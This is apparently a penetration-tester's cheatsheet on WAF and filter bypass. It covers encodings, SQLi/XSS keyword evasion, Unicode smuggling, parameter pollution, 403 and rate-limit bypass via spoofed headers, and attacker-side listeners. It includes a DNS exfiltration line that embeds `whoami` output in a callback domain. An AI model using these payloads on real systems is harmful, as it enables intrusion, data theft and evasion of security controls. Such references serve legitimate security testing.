# 00 - WAF / Filters / Encodings (cross-cutting cheatsheet)

Cross-reference with every other file whenever a payload is blocked, normalized, or escaped. Principle: understand **where** the filtering happens (network WAF, application validation, output encoding), then pick the right technique.

## Diagnose the block
- Sudden 403/406/429, or body "Request blocked" / "Access Denied" → **network WAF** (Cloudflare, Akamai, AWS WAF, Imperva, F5, ModSecurity).
- 200 response but payload missing/escaped → **application filtering/encoding**.
- Fingerprint the WAF: header/cookie (`__cfduid`, `cf-ray`, `x-akamai`, `x-sucuri`, `incap_ses`), block page, `wafw00f`.
- Baseline: send the clean payload, then degrade it progressively to find the exact token that triggers.

## Encodings (try in order, per context)
- **URL**: `%27` (`'`), `%2e%2e%2f` (`../`), double `%252e`, triple.
- **Double URL-encoding**: useful when a proxy decodes once then hands off to the app which decodes again.
- **Unicode / overlong UTF-8**: `%c0%ae` (`.`), `%e0%80%ae`, `．` (fullwidth `.`), `＜` (`<`).
- **HTML entities**: `&lt;`, `&#60;`, `&#x3c;`, `&#0000060;`, `&colon;`.
- **Base64**: JSON/JWT/data-URI contexts.
- **Case**: `SeLeCt`, `ScRiPt` (naive case-sensitive filters).
- **Mixed**: combine URL + unicode + case.

## Keyword bypass (generic)
- **Inline comments**: SQL `SE/**/LECT`, `UN/**/ION`; MySQL `/*!50000SELECT*/`.
- **Concatenation / junk chars**: `java\tscript:`, `<scr<script>ipt>` (if stripping is non-recursive), `on\x00error`.
- **Alt case & whitespace**: tab `%09`, newline `%0a`, `%0d`, `%0c`, `%a0`, `/**/`, `+`, `()`.
- **Doubling**: if the filter strips `../` once → `....//`, `..././`.
- **Equivalent representations**: `127.0.0.1` → `127.1`, `0x7f000001`, `2130706433`, `[::]`, `0177.0.0.1` (see `SSRF.md`).

## Unicode combining marks (Zalgo) smuggling
- Insert combining diacritics (U+0300-036F) inside a keyword so a signature filter misses it, then a downstream strip/normalize reassembles it: `<scr` + combining mark + `ipt>` can pass a `<script>` filter and re-form after cleanup. Smuggles a second injection (XSS, SQLi).
- NFC/NFKC do NOT strip combining marks (normalization is a false friend); only Unicode-category filtering (drop `Mn`/`Me`) does.
- Also a desync probe: graphemes (human/`maxlength`) vs codepoints (`len()`) vs UTF-8 bytes (DB) never match on stacked marks, so truncation/corruption/DoS. Gen: `python -c "import random;b=[chr(c) for c in range(0x300,0x370)];print(''.join(ch+''.join(random.choice(b) for _ in range(50)) for ch in 'admin'))"`

## Application-validation bypass
- **Content-Type switch**: swap JSON↔form-urlencoded↔multipart↔XML to change the parser (controls often differ per parser).
- **Duplicate parameter (HTTP Parameter Pollution)**: `?id=1&id=2` - front reads the 1st, back the 2nd (or vice versa). Can bypass a filter applied to a single occurrence.
- **Parameter/JSON key case**: `ID`, `Id`, `role` vs `Role`.
- **Extra fields**: mass assignment (`isAdmin`, `role`) → `API_MASS_ASSIGNMENT.md`.
- **JSON tricks**: duplicate keys `{"role":"user","role":"admin"}`, unexpected types (`"1"` vs `1` vs `[1]` vs `{"$gt":""}` for NoSQL), unicode in keys.
- **Path normalization**: `/api/v1/../admin`, `//admin`, `/admin/.`, `/admin%2f`, `;/`, encoded `/`.

## Access-control bypass (403/401)
- Spoof headers: `X-Forwarded-For`, `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `X-Custom-IP-Authorization`, `X-Originating-IP`, `X-Remote-IP`, `X-Client-IP`, `Referer`.
- Path: `/admin` → `/admin/`, `/admin/.`, `/./admin`, `/admin%20`, `/admin..;/`, `/ADMIN`, `/%61dmin`, `/admin?`, `/admin#`.
- Method: `GET`→`POST`→`PUT`→`HEAD`→`OPTIONS`→`PATCH`→custom (`FOO`). Override: `X-HTTP-Method-Override: PUT`.
- Protocol/version: HTTP/1.0 vs HTTP/2, with/without trailing slash.
- Tools: `nomore403`, Burp/Caido "403 bypass" plugins, ffuf over variants.

## Rate-limit / anti-brute bypass
- Rotate `X-Forwarded-For` (one IP per request), `X-Real-IP`.
- Identifier case/format (`User@x.com` vs `user@x.com`), whitespace, null byte, Gmail dot trick.
- Alternate endpoints (mobile API, GraphQL, `/v1` vs `/v2`).
- Reset the counter by rotating session/token each attempt.
- Race condition on the counter → `RACE_CONDITIONS.md`.

## Out-of-band (OOB) exfiltration - when there is no direct output
- DNS/HTTP callback: Burp Collaborator, `interactsh` (projectdiscovery), webhook.site, requestbin, canarytokens.
- Useful for blind SQLi/SSRF/XXE/SSTI/RCE. Encode data into the DNS subdomain (`$(whoami).xxx.oast.fun`).

## Quick attacker-side servers (listeners / redirectors / exfil)
- HTTP: `python3 -m http.server 8080`, `php -S 0.0.0.0:80`, `ruby -run -e httpd . -p 80`, `busybox httpd -f -p 80`.
- Raw 200 loop (nc): `while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK" | nc -lvp 80; done`.
- Infinite redirector (open-redirect/SSRF helper): PHP `<?php header("Location: http://VPS:8000"); ?>` in a loop, or a Python `SimpleHTTPRequestHandler` returning 301 to `http://VPS{path}`.
- HTTPS: `http.server.HTTPServer` + `ssl.wrap_socket(..., certfile=...)`. FTP: `python -m pyftpdlib -p 21`.

## References
- PayloadsAllTheThings - WAF Bypass - https://github.com/swisskyrepo/PayloadsAllTheThings (per-vuln folders, Bypass sections)
- PortSwigger - Obfuscating attacks using encodings - https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings
- 403bypasser / nomore403 - https://github.com/devploit/nomore403
- 403bypasser (yunemse48) - https://github.com/yunemse48/403bypasser
- 401/403 bypass guide (Vidoc) - https://blog.vidocsecurity.com/blog/401-and-403-bypass-how-to-do-it-right/
- HackTricks - Bypass 403/401 - https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/403-and-401-bypasses.html
- HTTP Parameter Pollution (OWASP WSTG) - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution
- Interactsh - https://github.com/projectdiscovery/interactsh
- YesWeHack - Syntax confusion / ambiguous parsing exploits - https://www.yeswehack.com/learn-bug-bounty/syntax-confusion-ambiguous-parsing-exploits
